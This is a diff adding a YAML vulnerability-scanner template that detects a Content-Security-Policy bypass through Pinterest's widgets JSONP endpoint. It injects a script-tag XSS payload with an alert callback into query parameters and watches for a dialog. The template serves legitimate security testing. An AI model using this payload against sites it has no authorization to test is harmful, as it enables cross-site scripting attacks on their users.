@@ -1,0 +1,55 @@
+id: pinterest-widgets-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Pinterest Widgets
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,pinterest-widgets
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "pinterest.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: pinterest_widgets_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "pinterest_widgets_csp_xss == true"
+# digest: 4a0a00473045022100c868be9eee33d2d14b7ae997469c5a893ad2837a8a60c6ac25aa5e5f40c221d7022063d5d8a69eca66b13110262b364bfeb161ccf3b537f7bbebf738301e11cf0c9c:922c64590222798bb761d5b6d8e72950
